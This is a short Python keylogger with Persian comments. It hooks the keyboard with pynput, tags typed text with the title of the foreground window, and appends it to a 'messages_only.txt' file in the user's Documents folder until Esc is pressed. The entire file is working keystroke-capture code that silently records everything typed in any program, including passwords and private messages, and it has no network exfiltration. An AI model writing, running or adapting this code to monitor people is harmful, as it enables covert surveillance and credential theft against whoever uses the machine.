from pynput import keyboard
import win32gui
import os

# مسیر فولدر Documents کاربر فعلی
documents_path = os.path.join(os.path.expanduser("~"), "Documents")
log_file = os.path.join(documents_path, "messages_only.txt")

last_window = None
buffer = ""

def get_active_window_title():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

def save_buffer(window_title):
    global buffer
    if buffer.strip():  # فقط اگه متن واقعی تایپ شده باشه
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"\n[{window_title}]\n{buffer}\n")
        buffer = ""

def on_press(key):
    global last_window, buffer

    current_window = get_active_window_title()
    if last_window is None:
        last_window = current_window
    elif current_window != last_window:
        save_buffer(last_window)
        last_window = current_window

    try:
        if key.char.isprintable():
            buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer = buffer[:-1]
        elif key == keyboard.Key.enter:
            save_buffer(current_window)
            buffer = ""

def on_release(key):
    if key == keyboard.Key.esc:
        save_buffer(last_window)
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
